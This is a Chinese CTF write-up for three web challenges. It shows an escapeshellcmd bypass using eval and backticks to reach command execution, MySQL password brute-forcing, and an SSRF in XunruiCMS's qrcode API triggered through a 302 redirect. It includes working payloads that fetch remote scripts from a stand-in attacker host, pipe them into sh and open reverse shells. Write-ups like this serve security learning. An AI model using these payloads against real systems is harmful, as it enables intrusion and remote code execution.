# Simple_php
	- 思路
		- 使用eval执行任意字符串，使用反引号绕过关键字检测，实现RCE
		- 爆破服务器数据库账号密码，正向代理连接拿flag
	- 实现RCE
		- 服务器会使用`escapeshellcmd`转义命令中的特殊字符，输入的特殊字符会被当成字符串的一部分
		- bash中的`eval`可以将任意字符串作为命令执行，可以用来绕过这个限制
		- 此时在使用反引号时，`escapeshellcmd`加上的反斜杠会被bash解析掉，最后将不带有反斜杠的反引号传给`eval`
		- 所以可以使用这样的payload实现RCE
			- ```bash
			  eval l``s
			  ```
		- 然后配合base64即可实现反弹shell
			- ```python
			  url = "http://eci-2zeflmaf18uscclpyfy6.cloudeci1.ichunqiu.com/"
			  r = base_post(url, data={"cmd": "eval ec``ho 把要执行的命令编码后放在这里|base6``4 -d|s``h|s``h"})
			  print(r.text)
			  
			  ```
	- 拿到flag
		- 检查了根目录和环境变量，发现没有flag
		- 查看进程发现有mysql
		- 使用fscan爆破mysql的密码，可以得到用户名和密码均为`root`
		- 连接上数据库即可拿到flag
			- ```
			  mysql> use PHP_CMS
			  Reading table information for completion of table and column names
			  You can turn off this feature to get a quicker startup with -A
			  
			  Database changed
			  mysql> show tables;
			  +-------------------+
			  | Tables_in_PHP_CMS |
			  +-------------------+
			  | F1ag_Se3Re7       |
			  +-------------------+
			  1 row in set (0.15 sec)
			  
			  mysql> select * from F1ag_Se3Re7
			      -> ;
			  +----+--------------------------------------------+
			  | id | f1ag66_2024                                |
			  +----+--------------------------------------------+
			  |  1 | flag{b485423a-e068-48e9-9e4b-257a1b5a484c} |
			  +----+--------------------------------------------+
			  1 row in set (0.14 sec)
			  ```
	- 施工过程
		- fuzz
			- 不会被escapeshellcmd转义的字符
				- ```python
				  [" ","!","%","+",",","-",".","/",":","=",]
				  # 还有数字和大小写字符
				  ```
			- 可用payload
				- uname
				- `uname -a`
				- `base32 --version`
				- `base32 /proc/net/arp`
					- 可以用来读取文件
					- 类似的: `basenc`
				- `install /proc/net/arp arp`可以用来复制文件
					- 网站目录没有写入权限
				- `ln -s current .`
				- `du /etc --max-depth=1 -a -h`
					- 可以用来查看文件夹
				- `eval uname`
					- ```shell
					  eval l``s
					  ```
					- 可以绕过WAF！
		- RCE
			- 传入任意`base64`并解码执行
			- ```python
			  url = "http://eci-2zedpvk47flcn04c33i5.cloudeci1.ichunqiu.com"
			  r = base_post(url, data={"cmd": "eval ec``ho Y3VybCB4eHg6NDA1Mi9hLnNo|base6``4 -d|s``h|s``h"})
			  print(r.text)
			  ```
- # easycms
	- 扫描
		- `/flag.php`
			- 提示`Just input 'cmd' From 127.0.0.1`
			- 尝试Header伪造不成功，所以应该是SSRF的洞
		- `/Readme.txt`
			- 提示是`迅睿CMS`
	- 到Github上下载源码
		- https://github.com/dayrui/xunruicms
	- 全局搜索`curl_init`，看到`dr_catcher_data`函数含有发送HTTP请求的功能
	- 全局搜索`dr_catcher_data`，看到`Api::qrcode`这个含有其的调用
	- 首先尝试构造请求，发现`127.0.0.1`和`localhost`被禁止，提示`ip不正确`
		- ```python
		  params = {
		      "s": "api",
		      "c": "api",
		      "m": "qrcode",
		      "text": "123",
		      "thumb": "http://localhost:8080/",
		  }
		  
		  r = base_get(url, params=params)
		  print(r.text)
		  with open("out.png", "wb") as f:
		      f.write(r.content)
		  ```
	- 然后尝试构造302跳转，绕过localhost关键字检测
		- 写一个flask服务端部署到VPS上，用于构造恶意302跳转
			- ```python
			  from flask import Flask, redirect
			  from urllib.parse import quote
			  
			  app = Flask(__name__)
			  
			  @app.route("/")
			  def index():
			      return redirect("http://127.0.0.1/flag.php?cmd=" + quote("curl xxx:4052/a.sh|sh"), code=302)
			  
			  if __name__ == "__main__":
			      app.run(port=4053)
			  ```
		- 然后发送恶意请求到`Api::qrcode`
			- ```python
			  params = {
			      "s": "api",
			      "c": "api",
			      "m": "qrcode",
			      "text": "123",
			      "thumb": "http://xxx:4053/",
			  }
			  
			  r = base_get(url, params=params)
			  print(r.text)
			  with open("out.png", "wb") as f:
			      f.write(r.content)
			  ```
		- 这样就可以实现RCE，实际执行的命令由上面的flask服务端发出
	- 最后利用RCE获得反弹shell，拿flag即可
		- ```text
		  meterpreter > shell
		  Process 581 created.
		  Channel 1 created.
		  ls /
		  bin
		  boot
		  dev
		  etc
		  flag
		  home
		  lib
		  lib32
		  lib64
		  libx32
		  media
		  mnt
		  opt
		  proc
		  readflag
		  root
		  run
		  sbin
		  srv
		  sys
		  tmp
		  usr
		  var
		  /readflag
		  flag{62a1b2cd-a58d-4c29-a693-86492a7e4c20}
		  
		  ```
- # easycms_revenge
	- 流程和easycms一样，但是返回302跳转时需要返回一些内容绕过图像检测
	- 首先准备一个VPS（假设IP为xxx），然后在上面放一个php文件用来返回302
		- ```php
		  <?php
		  header("location: http://127.0.0.1/flag.php?cmd=curl http://xxx:4052/text.b64 | base64 -d | sh");
		  echo "#define width 1234\n";
		  echo "#define height 1234";
		  ```
	- 然后在`text.b64`里放base64编码的反弹shell payload，让目标执行
	- 最后打上去，触发SSRF
		- ```python
		  params = {
		      "s": "api",
		      "c": "api",
		      "m": "qrcode",
		      "text": "1143",
		      # "thumb": "http://df050505.2ac2b0b5.rbndr.us:4052/flag.php?cmd=" + encoder.urlencode("sleep 5;"),
		      "thumb": "http://xxx:4052/",
		  }
		  r = base_get(url, params=params)
		  print(r.text)
		  ```
		- ```text
		  MP > shell
		  Process 501 created.
		  Channel 0 created.
		  /readflag
		  flag{cff2c6eb-58b5-4cd7-8faf-188fe1fd9997}
		  ```